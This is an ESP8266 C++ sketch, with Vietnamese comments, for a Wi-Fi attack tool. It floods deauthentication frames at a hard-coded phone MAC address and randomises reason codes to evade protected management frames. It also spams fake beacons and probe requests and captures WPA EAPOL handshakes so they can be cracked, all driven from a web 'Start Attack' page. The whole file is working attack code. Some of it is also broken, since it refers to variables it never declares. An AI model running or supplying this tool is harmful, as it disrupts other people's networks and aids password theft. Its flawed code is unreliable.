#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>  // Có sẵn trong core ESP8266

extern "C" {
  #include "user_interface.h"
}

// CONFIG CỰC MẠNH
#define CHANNEL 5               // Cố định channel 5
#define DEAUTH_INTERVAL 2       // Delay giữa gói deauth (ms) - nhỏ để flood mạnh (tương đương 500 gói/s)
#define BEACON_SPAM_COUNT 50    // Số SSID fake khi spam
#define PROBE_FLOOD_COUNT 100   // Số probe flood/giây
#define RANDOM_REASON true      // Random reason code để bypass PMF

// MAC target (đã thêm MAC OPPO A7 của bạn)
uint8_t targetMac[6] = {0xA4, 0x12, 0x32, 0x8B, 0x54, 0x0F};  // MAC OPPO A7 - Bro thay bằng MAC khác nếu cần

// Buffer lưu 4 gói EAPOL (đủ handshake)
uint8_t eapolBuffers[4][512];
uint16_t eapolLens[4] = {0};
int eapolCount = 0;

bool attackRunning = false;

// Gói deauth mẫu
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0x00, 0x00, 0x07, 0x00
};

// Web server tại port 80
ESP8266WebServer server(80);

// Callback sniffer
void sniffer_cb(uint8_t *buf, uint16_t len) {
  if (len < 50 || eapolCount >= 4) return;

  uint8_t fc = buf[0];
  if ((fc & 0xFC) != 0x88 || (buf[1] & 0x40) == 0) return;

  uint8_t *payload = buf + 24 + ((fc >> 4) & 0x08 ? 2 : 0);

  if (payload[6] == 0x88 && payload[7] == 0x8E) {
    memcpy(eapolBuffers[eapolCount], buf, len);
    eapolLens[eapolCount] = len;
    eapolCount++;
    Serial.print("\n[SNIF] EAPOL #");
    Serial.print(eapolCount);
    Serial.print(" DETECTED! Len: ");
    Serial.println(len);
  }
}

// Trang web
void handleRoot() {
  String html = "<html><body><h1>Deauth Tool</h1>";
  html += "<p>Status: " + String(attackRunning ? "Running" : "Stopped") + "</p>";
  html += "<form action='/on'><input type='submit' value='Start Attack'></form>";
  html += "<form action='/off'><input type='submit' value='Stop Attack'></form>";
  html += "<h2>Captured EAPOL (" + String(eapolCount) + ")</h2>";
  for (int i = 0; i < eapolCount; i++) {
    html += "<p>EAPOL #" + String(i+1) + " Len: " + String(eapolLens[i]) + "</p>";
    html += "<textarea rows='5' cols='50'>";
    for (int j = 0; j < eapolLens[i]; j++) {
      char hex[3];
      sprintf(hex, "%02X ", eapolBuffers[i][j]);
      html += hex;
    }
    html += "</textarea><br>";
  }
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// Start attack
void handleOn() {
  attackRunning = true;
  server.sendHeader("Location", "/");
  server.send(302);
}

// Stop attack
void handleOff() {
  attackRunning = false;
  server.sendHeader("Location", "/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n[START] ESP8266 Deauth + Scan + Sniffer CUC MANH - Channel 5 with Web");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("DeauthTool", "password123");  // AP: SSID "DeauthTool", pass "password123"
  Serial.print("IP Web: ");
  Serial.println(WiFi.softAPIP());  // 192.168.4.1

  server.on("/", handleRoot);
  server.on("/on", handleOn);
  server.on("/off", handleOff);
  server.begin();

  WiFi.disconnect();
  delay(100);

  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(sniffer_cb);
  wifi_set_channel(CHANNEL);

  Serial.println("Da san sang - Truy cap 192.168.4.1 tu dien thoai!");
}

void loop() {
  server.handleClient();  // Xử lý web

  // Scan mỗi 10s
  static uint32_t lastScan = 0;
  if (millis() - lastScan > 10000) {
    Serial.println("\n[SCAN] Ket qua:");
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
      Serial.printf("%d | %s | MAC: %s | Ch: %d | RSSI: %d\n",
                    i+1, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
    }
    WiFi.scanDelete();
    lastScan = millis();
  }

  // Flood deauth nếu attack chạy
  static uint32_t lastDeauth = 0;
  if (attackRunning && millis() - lastDeauth > DEAUTH_INTERVAL) {
    if (RANDOM_REASON) deauthPacket[24] = random(1, 11);
    for (int i = 0; i < 6; i++) {
      deauthPacket[10 + i] = random(0xFF);
      deauthPacket[16 + i] = random(0xFF);
    }
    memcpy(deauthPacket + 4, targetMac, 6);
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    Serial.print(".");
    lastDeauth = millis();
  }

  // Beacon spam nếu attack
  static uint32_t lastBeacon = 0;
  if (attackRunning && millis() - lastBeacon > 100) {
    for (int i = 0; i < BEACON_SPAM_COUNT; i++) {
      uint8_t beacon[128];
      memset(beacon, 0, 128);
      beacon[0] = 0x80;
      memcpy(beacon + 4, targetMac, 6);
      memcpy(beacon + 10, targetMac, 6);
      sprintf((char*)beacon + 26, "Fake_%d", i);
      wifi_send_pkt_freedom(beacon, 36, 0);
    }
    lastBeacon = millis();
  }

  // Probe flood nếu attack
  static uint32_t lastProbe = 0;
  if (attackRunning && millis() - lastProbe > 10) {
    for (int i = 0; i < PROBE_FLOOD_COUNT; i++) {
      uint8_t probe[64];
      memset(probe, 0, 64);
      probe[0] = 0x40;
      memcpy(probe + 4, targetMac, 6);
      sprintf((char*)probe + 26, "Probe_%d", i);
      wifi_send_pkt_freedom(probe, 36, 0);
    }
    lastProbe = millis();
  }

  // Xử lý EAPOL
  if (capturedEapol) {
    Serial.println("\n[SNIF] Da bat duoc EAPOL! Hex dump:");
    for (int i = 0; i < eapolLen; i++) {
      Serial.printf("%02X ", eapolBuffer[i]);
      if ((i+1) % 16 == 0) Serial.println();
    }
    Serial.println("\nCopy hex de crack!");
    capturedEapol = false;
  }

  yield();
  delay(1);  // Tránh treo
}

// Serial control (on/off)
void serialEvent() {
  while (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd == "on") {
      attackRunning = true;
      Serial.println("[ATTACK] Da bat!");
    } else if (cmd == "off") {
      attackRunning = false;
      Serial.println("[ATTACK] Da dung!");
    }
  }
}
